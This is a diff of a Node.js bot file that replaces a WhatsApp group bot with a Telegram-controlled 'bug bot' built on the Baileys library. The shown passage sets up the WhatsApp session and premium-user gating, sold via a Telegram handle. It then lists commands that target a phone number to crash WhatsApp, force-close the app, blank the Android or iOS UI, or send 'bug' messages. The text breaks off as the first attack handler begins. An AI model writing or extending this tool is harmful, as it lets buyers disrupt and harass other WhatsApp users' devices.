@@ -1,706 +1,1036 @@
-require('./settings')
-const { modul } = require('./module');
+const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
+const fs = require('fs');
 const moment = require('moment-timezone');
-const { baileys, boom, chalk, fs, figlet, FileType, path, pino, process, PhoneNumber, axios, yargs, _ } = modul;
-const { Boom } = boom
 const {
-	default: XeonBotIncConnect,
-	BufferJSON,
-	processedMessages,
-	PHONENUMBER_MCC,
-	initInMemoryKeyStore,
-	DisconnectReason,
-	AnyMessageContent,
-        makeInMemoryStore,
-	useMultiFileAuthState,
-	delay,
-	fetchLatestBaileysVersion,
-	generateForwardMessageContent,
-    prepareWAMessageMedia,
-    generateWAMessageFromContent,
-    generateMessageID,
-    downloadContentFromMessage,
-    jidDecode,
-    makeCacheableSignalKeyStore,
-    getAggregateVotesInPollMessage,
-    proto
-} = require("@whiskeysockets/baileys")
-const cfonts = require('cfonts');
-const { color, bgcolor } = require('./lib/color')
-const { TelegraPh } = require('./lib/uploader')
-const NodeCache = require("node-cache")
-const canvafy = require("canvafy")
-const { 
-  addSewaGroup, 
-  checkSewaGroup, 
-  getSewaPosition, 
-  msToDate, 
-  expiredCheck, 
-  remindSewa, 
-  getGcName 
-} = require('./lib/sewa')
-global.sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
-const { parsePhoneNumber } = require("libphonenumber-js")
-let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
-let _left = JSON.parse(fs.readFileSync('./database/left.json'))
-const makeWASocket = require("@whiskeysockets/baileys").default
-const Pino = require("pino")
-const readline = require("readline")
-const colors = require('colors')
-const { start } = require('./lib/spinner')
-const { uncache, nocache } = require('./lib/loader')
-const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
-const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, reSize } = require('./lib/myfunc')
+    makeWASocket,
+    makeInMemoryStore,
+    fetchLatestBaileysVersion,
+    useMultiFileAuthState,
+    DisconnectReason,
+    generateWAMessageFromContent
+} = require("@whiskeysockets/baileys");
+const pino = require('pino');
+const chalk = require('chalk');
+const { BOT_TOKEN } = require("./config");
+const crypto = require('crypto');
+const premiumFile = './premiumuser.json';
+const ownerFile = './owneruser.json';
+const TOKENS_FILE = "./tokens.json";
+let bots = [];
 
-const prefix = ''
-let phoneNumber = "6285187063723"
-global.db = JSON.parse(fs.readFileSync('./database/database.json'))
-if (global.db) global.db = {
-sticker: {},
-database: {}, 
-groups: {}, 
-game: {},
-others: {},
-users: {},
-chats: {},
-settings: {},
-...(global.db || {})
-}
-const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
+const bot = new Telegraf(BOT_TOKEN);
 
-const useMobile = process.argv.includes("--mobile")
-const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
+bot.use(session());
 
-const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
+let Ndok = null;
+let isWhatsAppConnected = false;
+let linkedWhatsAppNumber = '';
+const usePairingCode = true;
 
-const question = (text) => new Promise((resolve) => rl.question(text, resolve))
-require('./hydro.js')
-nocache('../hydro.js', module => console.log(color('[ CHANGE ]', 'green'), color(`'${module}'`, 'green'), 'Updated'))
-require('./index.js')
-nocache('../index.js', module => console.log(color('[ CHANGE ]', 'green'), color(`'${module}'`, 'green'), 'Updated'))
+const blacklist = ["6142885267", "7275301558", "1376372484"];
 
-async function hydroInd() {
-	const {  saveCreds, state } = await useMultiFileAuthState(`./${sessionName}`)
-	const msgRetryCounterCache = new NodeCache()
-    	const hydro = XeonBotIncConnect({
-        logger: pino({ level: 'silent' }),
-        printQRInTerminal: !pairingCode, // popping up QR in terminal log
-      mobile: useMobile, // mobile api (prone to bans)
-     auth: {
-         creds: state.creds,
-         keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
-      },
-      browser: [ 'Mac OS', 'Safari', '10.15.7' ],
-      patchMessageBeforeSending: (message) => {
-            const requiresPatch = !!(
-                message.buttonsMessage ||
-                message.templateMessage ||
-                message.listMessage
+const randomImages = [
+    "https://files.catbox.moe/i52sne.jpeg",
+    "https://files.catbox.moe/i52sne.jpeg",
+    "https://files.catbox.moe/i52sne.jpeg",
+    "https://files.catbox.moe/i52sne.jpeg",
+    "https://files.catbox.moe/i52sne.jpeg",
+    "https://files.catbox.moe/i52sne.jpeg"
+ 
+]; 
+
+
+const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];
+
+// Fungsi untuk mendapatkan waktu uptime
+const getUptime = () => {
+    const uptimeSeconds = process.uptime();
+    const hours = Math.floor(uptimeSeconds / 3600);
+    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+    const seconds = Math.floor(uptimeSeconds % 60);
+
+    return `${hours}h ${minutes}m ${seconds}s`;
+};
+
+const question = (query) => new Promise((resolve) => {
+    const rl = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    rl.question(query, (answer) => {
+        rl.close();
+        resolve(answer);
+    });
+});
+
+// --- Koneksi WhatsApp ---
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+
+const startSesi = async () => {
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    const { version } = await fetchLatestBaileysVersion();
+
+    const connectionOptions = {
+        version,
+        keepAliveIntervalMs: 30000,
+        printQRInTerminal: false,
+        logger: pino({ level: "silent" }), // Log level diubah ke "info"
+        auth: state,
+        browser: ['Mac OS', 'Safari', '10.15.7'],
+        getMessage: async (key) => ({
+            conversation: 'P', // Placeholder, you can change this or remove it
+        }),
+    };
+
+    Ndok = makeWASocket(connectionOptions);
+
+    Ndok.ev.on('creds.update', saveCreds);
+    store.bind(Ndok.ev);
+
+    Ndok.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+
+        if (connection === 'open') {
+            isWhatsAppConnected = true;
+            console.log(chalk.white.bold(`
+╭──────────────────────⟤
+│  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
+╰──────────────────────⟤`));
+        }
+
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log(
+                chalk.white.bold(`
+╭──────────────────────⟤
+│ ${chalk.red.bold('WHATSAPP TERPUTUS')}
+╰──────────────────────⟤`),
+                shouldReconnect ? chalk.white.bold(`
+╭──────────────────────⟤
+│ ${chalk.red.bold('HUBUNGKAN ULANG')}
+╰──────────────────────⟤`) : ''
             );
-            if (requiresPatch) {
-                message = {
-                    viewOnceMessage: {
-                        message: {
-                            messageContextInfo: {
-                                deviceListMetadataVersion: 2,
-                                deviceListMetadata: {},
-                            },
-                            ...message,
-                        },
-                    },
-                };
+            if (shouldReconnect) {
+                startSesi();
             }
-            return message;
-        },
-      auth: {
-         creds: state.creds,
-         keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }).child({ level: "fatal" })),
-      },
-connectTimeoutMs: 60000,
-defaultQueryTimeoutMs: 0,
-keepAliveIntervalMs: 10000,
-emitOwnEvents: true,
-fireInitQueries: true,
-generateHighQualityLinkPreview: true,
-syncFullHistory: true,
-markOnlineOnConnect: true,
-      getMessage: async (key) => {
-            if (store) {
-                const msg = await store.loadMessage(key.remoteJid, key.id)
-                return msg.message || undefined
-            }
-            return {
-                conversation: "Hydro Bot Here!"
-            }
-        },
-      msgRetryCounterCache, // Resolve waiting messages
-      defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
-   })
-if (!hydro.authState.creds.registered) {
-const phoneNumber = await question('Masukin nomor yang mau dijadikan bot.. contoh: 6285187063723\n');
-const pairinghydro = "FOCABARS";
-let code = await hydro.requestPairingCode(phoneNumber, pairinghydro);
-code = code?.match(/.{1,4}/g)?.join("-") || code;
-console.log(`Ini kodenya:`, code);
-}
-    store.bind(hydro.ev)
-
-hydro.ev.on('connection.update', async (update) => {
-	const {
-		connection,
-		lastDisconnect
-	} = update
-try{
-		if (connection === 'close') {
-			let reason = new Boom(lastDisconnect?.error)?.output.statusCode
-			if (reason === DisconnectReason.badSession) {
-				console.log(`Bad Session File, Please Delete Session and Scan Again`);
-				hydroInd()
-			} else if (reason === DisconnectReason.connectionClosed) {
-				console.log("Connection closed, reconnecting....");
-				hydroInd();
-			} else if (reason === DisconnectReason.connectionLost) {
-				console.log("Connection Lost from Server, reconnecting...");
-				hydroInd();
-			} else if (reason === DisconnectReason.connectionReplaced) {
-				console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First");
-				hydroInd()
-			} else if (reason === DisconnectReason.loggedOut) {
-				console.log(`Device Logged Out, Please Scan Again And Run.`);
-				hydroInd();
-			} else if (reason === DisconnectReason.restartRequired) {
-				console.log("Restart Required, Restarting...");
-				hydroInd();
-			} else if (reason === DisconnectReason.timedOut) {
-				console.log("Connection TimedOut, Reconnecting...");
-				hydroInd();
-			} else {
-			  console.log(`Unknown DisconnectReason: ${reason}|${connection}`)
-			  hydroInd();
-			}
-		}
-		if (update.connection == "connecting" || update.receivedPendingNotifications == "false") {
-			console.log(color(`\n👀Menghubungkan...`, 'yellow'))
-		}
-		if (update.connection == "open" || update.receivedPendingNotifications == "true") {
-			await delay(1999)
-cfonts.say('HydroMD', {
-    font: 'block',
-    align: 'left',
-    colors: ['blue', 'blueBright'],
-    background: 'transparent',
-    maxLength: 18,
-    rawMode: false,
-});
-hydro.newsletterFollow('120363416755002041@newsletter')
-hydro.newsletterFollow('120363314571321104@newsletter')
-hydro.newsletterFollow('120363186130999681@newsletter')
-hydro.newsletterFollow('120363420997249538@newsletter')
-hydro.newsletterFollow('120363422125048324@newsletter')
-		}
-} catch (err) {
-	  console.log('Error in Connection.update '+err)
-	  hydroInd();
-	}
-	
-})
-
-await delay(5555) 
-start('2',colors.bold.white('\n\nMenunggu Pesan Baru..'))
-
-global.hydro = hydro
-
-hydro.ev.on('creds.update', await saveCreds)
-
-    // Anti Call
-    hydro.ev.on('call', async (XeonPapa) => {
-    let botNumber = await hydro.decodeJid(hydro.user.id)
-    let XeonBotNum = db.settings[botNumber].anticall
-    if (!XeonBotNum) return
-    console.log(XeonPapa)
-    for (let XeonFucks of XeonPapa) {
-    if (XeonFucks.isGroup == false) {
-    if (XeonFucks.status == "offer") {
-    let XeonBlokMsg = await hydro.sendTextWithMentions(XeonFucks.from, `*${hydro.user.name}* can't receive ${XeonFucks.isVideo ? `video` : `voice` } call. Sorry @${XeonFucks.from.split('@')[0]} you will be blocked. If accidentally please contact the owner to be unblocked !`)
-    hydro.sendContact(XeonFucks.from, global.owner, XeonBlokMsg)
-    await sleep(8000)
-    await hydro.updateBlockStatus(XeonFucks.from, "block")
-    }
-    }
-    }
-    })
-hydro.ev.on('messages.upsert', async chatUpdate => {
-try {
-const kay = chatUpdate.messages[0]
-if (!kay.message) return
-kay.message = (Object.keys(kay.message)[0] === 'ephemeralMessage') ? kay.message.ephemeralMessage.message : kay.message
-if (kay.key && kay.key.remoteJid === 'status@broadcast')  {
-await hydro.readMessages([kay.key]) }
-if (!hydro.public && !kay.key.fromMe && chatUpdate.type === 'notify') return
-if (kay.key.id.startsWith('903D') && kay.key.id.length === 14) return
-const m = smsg(hydro, kay, store)
-require('./hydro')(hydro, m, chatUpdate, store)
-} catch (err) {
-console.log(err)}})
-    async function getMessage(key){
-        if (store) {
-            const msg = await store.loadMessage(key.remoteJid, key.id)
-            return msg?.message
+            isWhatsAppConnected = false;
         }
-        return {
-            conversation: "Hydro Bot Ada Di Sini"
-        }
-    }
-    hydro.ev.on('messages.update', async chatUpdate => {
-        for(const { key, update } of chatUpdate) {
-			if(update.pollUpdates && !key.fromMe) {
-				const pollCreation = await getMessage(key)
-				if(pollCreation) {
-				    const pollUpdate = await getAggregateVotesInPollMessage({
-							message: pollCreation,
-							pollUpdates: update.pollUpdates,
-						})
-	                var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
-	                if (toCmd == undefined) return
-                    var prefCmd = prefix+toCmd
-	                hydro.appenTextMessage(prefCmd, chatUpdate)
-				}
-			}
-		}
-    })
-// === Interval Cek Sewa ===
-setInterval(async () => {
-    try {
-        // hapus expired
-        sewa = expiredCheck(sewa)
-
-        // kirim reminder
-        await remindSewa(hydro, sewa)
-
-        // auto keluar grup kalau expired
-        for (let x of sewa) {
-            if (!x.id) continue // fix bug undefined
-            if (x.expired !== "PERMANENT" && x.expired <= Date.now()) {
-                try {
-                    await hydro.sendMessage(x.id, { text: "⏳ Masa sewa habis, bot akan keluar. Terima kasih telah menyewa 🙏" })
-                    await hydro.groupLeave(x.id)
-                } catch (e) {
-                    console.log("Gagal keluar grup:", e)
-                }
-            }
-        }
-    } catch (e) {
-        console.error("Interval sewa error:", e)
-    }
-}, 60 * 60 * 1000) // cek tiap 1 jam
-
-hydro.sendTextWithMentions = async (jid, text, quoted, options = {}) => hydro.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
-
-hydro.decodeJid = (jid) => {
-if (!jid) return jid
-if (/:\d+@/gi.test(jid)) {
-let decode = jidDecode(jid) || {}
-return decode.user && decode.server && decode.user + '@' + decode.server || jid
-} else return jid
+    });
 }
 
-hydro.ev.on('contacts.update', update => {
-for (let contact of update) {
-let id = hydro.decodeJid(contact.id)
-if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
-}
-})
+const loadJSON = (file) => {
+    if (!fs.existsSync(file)) return [];
+    return JSON.parse(fs.readFileSync(file, 'utf8'));
+};
 
-hydro.ev.on('groups.update', async (update) => {
-    try {
-        for (let x of update) {
-            if (x.id) {
-                // kalau approval dimatikan (join langsung)
-                if (x.joinApprovalMode === false) {
-                    let idx = sewa.findIndex(s => s.id === x.id && s.status === 'pending');
-                    if (idx !== -1) {
-                        sewa[idx].status = 'active';
-                        fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2));
-                        await hydro.sendMessage(x.id, { text: 
-                            `✅ Sewa telah aktif!\n\n` +
-                            `🏷️ Nama : *${await getGcName(x.id)}*\n` +
-                            `🆔 ID   : *${x.id}*\n` +
-                            `⏳ Durasi : *${msToDate(sewa[idx].expired - Date.now())}*`
-                        });
-                    }
-                }
-            }
-        }
-    } catch (e) {
-        console.error("groups.update error:", e);
+const saveJSON = (file, data) => {
+    fs.writeFileSync(file, JSON.stringify(data, null, 2));
+};
+
+// Muat ID owner dan pengguna premium
+let ownerUsers = loadJSON(ownerFile);
+let premiumUsers = loadJSON(premiumFile);
+
+// Middleware untuk memeriksa apakah pengguna adalah owner
+const checkOwner = (ctx, next) => {
+    if (!ownerUsers.includes(ctx.from.id.toString())) {
+        return ctx.reply("⛔ Anda bukan owner.");
     }
+    next();
+};
+
+// Middleware untuk memeriksa apakah pengguna adalah premium
+const checkPremium = (ctx, next) => {
+    if (!premiumUsers.includes(ctx.from.id.toString())) {
+        return ctx.reply("❌ Anda bukan pengguna premium.. Buy Premium Di @Ftmncloud");
+    }
+    next();
+};
+
+const checkWhatsAppConnection = (ctx, next) => {
+  if (!isWhatsAppConnected) {
+    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan /connect terlebih dahulu.");
+    return;
+  }
+  next();
+};
+
+bot.command('menu', async (ctx) => {
+    const userId = ctx.from.id.toString();
+
+    if (blacklist.includes(userId)) {
+        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
+    }
+    
+    const RandomBgtJir = getRandomImage();
+    const waktuRunPanel = getUptime(); // Waktu uptime panel
+
+    await ctx.replyWithPhoto(RandomBgtJir, {
+        caption: `\`\`\` 
+┏━━━━━⌠ 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 ⌡
+┃▢ 𝙳𝙴𝚅𝙾𝙻𝙾𝙿𝙴𝚁 : @Ftmncloud
+┃▢ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 5.0 (BETA) 
+┃▢ 𝚂𝚃𝙰𝚃𝚄𝚂 : VIP Script
+┃▢ 𝙻𝙴𝙰𝙶𝚄𝙴 : Java Scrip 
+┗━━━━━━━━━━━━━━━━━━━━━❍
+┏━━━━━⌠ 𝙼𝙴𝙽𝚄 𝙾𝚆𝙽 ⌡
+┃▢ /𝙲𝙾𝙽𝙽𝙴𝙲𝚃 628xx
+┃▢ /𝙰𝙳𝙳𝙿𝚁𝙴𝙼 ɪᴅ 
+┃▢ /𝙳𝙴𝙻𝙿𝚁𝙴𝙼 ɪᴅ 
+┃▢ /𝙲𝙴𝙺𝙿𝚁𝙴𝙼 ɪᴅ
+┗━━━━━━━━━━━━━━━━━━━━━❍
+┏━━━━━⌠ 𝙼𝙴𝙽𝚄 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 ⌡
+┃▢ /𝚁𝚈𝚈𝙲𝚁𝙰𝚂𝙷 628x
+┃    ╰> 𝙲𝚁𝙰𝚂𝙷𝙷 𝙰𝙻𝙻 𝚆𝙰
+┃▢ /𝚁𝚈𝚈𝙻𝙰𝚈 628x
+┃    ╰> 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 𝙳𝙴𝙻𝙰𝚈
+┗━━━━━━━━━━━━━━━━━━━━━❍      
+┏━━━━━⌠ 𝙽𝙾𝙽 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴 ⌡
+┃▢ /𝚁𝙸𝙸𝙱𝙻𝙰𝙽𝙺 628x
+┃    ╰> 𝙱𝙻𝙰𝙽𝙺 𝚂𝙸𝚂𝚃𝙴𝙼 𝚄𝙸
+┃▢ /𝚁𝙸𝙸𝙾𝚂 628x
+┃    ╰> 𝙱𝙻𝙰𝙽𝙺 𝚂𝙸𝚂𝚃𝙴𝙼 𝙸𝙾𝚂
+┗━━━━━━━━━━━━━━━━━━━━━❍
+
+┏━━━━━⌠ 𝙵𝙾𝚁𝙴𝙲𝙻𝙾𝚂𝙴 + 𝚄𝙸 ⌡
+┃▢ /𝚁𝙸𝙸𝚄𝙸 628x
+┃    ╰> 𝚂𝚃𝙾𝙿 𝚂𝚈𝚂𝚃𝙴𝙼 𝚄𝙸
+┃▢ /𝚁𝙸𝙸𝙵𝙲 628x
+┃    ╰> 𝙵𝙾𝚁𝙲𝙻𝙾𝚂𝙴 𝚆𝙰 𝙰𝙿𝙿
+┃▢ /𝚁𝙸𝙸𝙸𝙼𝙰𝙶𝙴 628x
+┃    ╰> 𝙱𝚄𝙶 𝙸𝙼𝙰𝙶𝙴
+┃▢ /𝚁𝙸𝙸𝙲𝙾𝙼𝙱𝙾 628x
+┃    ╰> 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
+┗━━━━━━━━━━━━━━━━━━━━━❍
+
+\`\`\` `,
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+            [Markup.button.url('「🌟 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 」', 'https://whatsapp.com/channel/0029Vb2G0U6L7UVQSTpmfy2q')],
+[Markup.button.url('「🌟 𝐋𝐈𝐍𝐊 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 」','https://chat.whatsapp.com/LiBmJj1b5I9CUSt5MDTqf5')]
+        ])
+    });
 });
 
-hydro.getName = (jid, withoutContact  = false) => {
-id = hydro.decodeJid(jid)
-withoutContact = hydro.withoutContact || withoutContact 
-let v
-if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
-v = store.contacts[id] || {}
-if (!(v.name || v.subject)) v = hydro.groupMetadata(id) || {}
-resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
-})
-else v = id === '0@s.whatsapp.net' ? {
-id,
-name: 'WhatsApp'
-} : id === hydro.decodeJid(hydro.user.id) ?
-hydro.user :
-(store.contacts[id] || {})
-return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
-}
 
-hydro.parseMention = (text = '') => {
-return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
-}
+bot.command("riiblank", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
 
-hydro.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-	let list = []
-	for (let i of kon) {
-	    list.push({
-	    	displayName: await hydro.getName(i),
-	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await hydro.getName(i)}\nFN:${await hydro.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
-	    })
-	}
-	hydro.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
-    }
-
-hydro.setStatus = (status) => {
-hydro.query({
-tag: 'iq',
-attrs: {
-to: '@s.whatsapp.net',
-type: 'set',
-xmlns: 'status',
-},
-content: [{
-tag: 'status',
-attrs: {},
-content: Buffer.from(status, 'utf-8')
-}]
-})
-return status
-}
-
-hydro.public = true // Mengatur seperti self <false> atau publik <true>
-
-hydro.sendImage = async (jid, path, caption = '', quoted = '', options) => {
-let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
-return await hydro.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
-}
-
-hydro.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
-let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
-let buffer
-if (options && (options.packname || options.author)) {
-buffer = await writeExifImg(buff, options)
-} else {
-buffer = await imageToWebp(buff)
-}
-await hydro.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
-.then( response => {
-fs.unlinkSync(buffer)
-return response
-})
-}
-
-hydro.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
-let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
-let buffer
-if (options && (options.packname || options.author)) {
-buffer = await writeExifVid(buff, options)
-} else {
-buffer = await videoToWebp(buff)
-}
-await hydro.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
-return buffer
-}
-
-hydro.copyNForward = async (jid, message, forceForward = false, options = {}) => {
-let vtype
-if (options.readViewOnce) {
-message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
-vtype = Object.keys(message.message.viewOnceMessage.message)[0]
-delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
-delete message.message.viewOnceMessage.message[vtype].viewOnce
-message.message = {
-...message.message.viewOnceMessage.message
-}
-}
-let mtype = Object.keys(message.message)[0]
-let content = await generateForwardMessageContent(message, forceForward)
-let ctype = Object.keys(content)[0]
-let context = {}
-if (mtype != "conversation") context = message.message[mtype].contextInfo
-content[ctype].contextInfo = {
-...context,
-...content[ctype].contextInfo
-}
-const waMessage = await generateWAMessageFromContent(jid, content, options ? {
-...content[ctype],
-...options,
-...(options.contextInfo ? {
-contextInfo: {
-...content[ctype].contextInfo,
-...options.contextInfo
-}
-} : {})
-} : {})
-await hydro.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
-return waMessage
-}
-
-hydro.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
-let quoted = message.msg ? message.msg : message
-let mime = (message.msg || message).mimetype || ''
-let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-const stream = await downloadContentFromMessage(quoted, messageType)
-let buffer = Buffer.from([])
-for await(const chunk of stream) {
-buffer = Buffer.concat([buffer, chunk])
-}
-let type = await FileType.fromBuffer(buffer)
-trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
-await fs.writeFileSync(trueFileName, buffer)
-return trueFileName
-}
-
-hydro.downloadMediaMessage = async (message) => {
-let mime = (message.msg || message).mimetype || ''
-let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-const stream = await downloadContentFromMessage(message, messageType)
-let buffer = Buffer.from([])
-for await(const chunk of stream) {
-buffer = Buffer.concat([buffer, chunk])
-}
-return buffer
-}
-
-hydro.getFile = async (PATH, save) => {
-let res
-let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-let type = await FileType.fromBuffer(data) || {
-mime: 'application/octet-stream',
-ext: '.bin'}
-filename = path.join(__filename, './lib' + new Date * 1 + '.' + type.ext)
-if (data && save) fs.promises.writeFile(filename, data)
-return {
-res,
-filename,
-size: await getSizeMedia(data),
-...type,
-data}}
-
-hydro.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
-let types = await hydro.getFile(path, true)
-let { mime, ext, res, data, filename } = types
-if (res && res.status !== 200 || file.length <= 65536) {
-try { throw { json: JSON.parse(file.toString()) } }
-catch (e) { if (e.json) throw e.json }}
-let type = '', mimetype = mime, pathFile = filename
-if (options.asDocument) type = 'document'
-if (options.asSticker || /webp/.test(mime)) {
-let { writeExif } = require('./lib/exif')
-let media = { mimetype: mime, data }
-pathFile = await writeExif(media, { packname: options.packname ? options.packname : global.packname, author: options.author ? options.author : global.author, categories: options.categories ? options.categories : [] })
-await fs.promises.unlink(filename)
-type = 'sticker'
-mimetype = 'image/webp'}
-else if (/image/.test(mime)) type = 'image'
-else if (/video/.test(mime)) type = 'video'
-else if (/audio/.test(mime)) type = 'audio'
-else type = 'document'
-await hydro.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
-return fs.promises.unlink(pathFile)}
-
-hydro.sendText = (jid, text, quoted = '', options) => hydro.sendMessage(jid, { text: text, ...options }, { quoted })
-
-hydro.serializeM = (m) => smsg(hydro, m, store)
-
-hydro.before = (teks) => smsg(hydro, m, store)
-
-hydro.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
-let buttonMessage = {
-text,
-footer,
-buttons,
-headerType: 2,
-...options
-}
-hydro.sendMessage(jid, buttonMessage, { quoted, ...options })
-}
-
-hydro.sendKatalog = async (jid , title = '' , desc = '', gam , options = {}) =>{
-let message = await prepareWAMessageMedia({ image: gam }, { upload: hydro.waUploadToServer })
-const tod = generateWAMessageFromContent(jid,
-{"productMessage": {
-"product": {
-"productImage": message.imageMessage,
-"productId": "9999",
-"title": title,
-"description": desc,
-"currencyCode": "INR",
-"priceAmount1000": "100000",
-"url": `${websitex}`,
-"productImageCount": 1,
-"salePriceAmount1000": "0"
-},
-"businessOwnerJid": `${ownernumber}@s.whatsapp.net`
-}
-}, options)
-return hydro.relayMessage(jid, tod.message, {messageId: tod.key.id})
-} 
-
-hydro.send5ButLoc = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
-var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
-templateMessage: {
-hydratedTemplate: {
-"hydratedContentText": text,
-"locationMessage": {
-"jpegThumbnail": img },
-"hydratedFooterText": footer,
-"hydratedButtons": but
-}
-}
-}), options)
-hydro.relayMessage(jid, template.message, { messageId: template.key.id })
-}
-global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name]: name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({
-    ...query, ...(apikeyqueryname ? {
-        [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name]: name]
-    }: {})
-})): '')
-
-hydro.sendButImg = async (jid, path, teks, fke, but) => {
-let img = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
-let fjejfjjjer = {
-image: img, 
-jpegThumbnail: img,
-caption: teks,
-fileLength: "1",
-footer: fke,
-buttons: but,
-headerType: 4,
-}
-hydro.sendMessage(jid, fjejfjjjer, { quoted: m })
-}
-
-            /**
-             * Send Media/File with Automatic Type Specifier
-             * @param {String} jid
-             * @param {String|Buffer} path
-             * @param {String} filename
-             * @param {String} caption
-             * @param {import('@adiwajshing/baileys').proto.WebMessageInfo} quoted
-             * @param {Boolean} ptt
-             * @param {Object} options
-             */
-hydro.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
-  let type = await hydro.getFile(path, true);
-  let { res, data: file, filename: pathFile } = type;
-
-  if (res && res.status !== 200 || file.length <= 65536) {
-    try {
